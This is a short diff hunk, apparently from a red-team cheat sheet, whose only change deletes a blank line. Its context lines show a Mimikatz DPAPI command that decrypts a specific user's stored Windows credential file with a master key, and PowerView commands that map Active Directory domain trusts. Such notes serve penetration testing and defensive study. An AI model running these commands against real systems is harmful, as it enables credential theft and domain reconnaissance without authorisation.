@@ -83,7 +83,6 @@ Mimikatz DPAPI
   Decrypt Credential File
       mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb8......
       
-  
 PowerView
   Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
   Trust Mapping: Get-DomainTrustMapping to | Export-CSV -NoTypeInformation trusts.csv
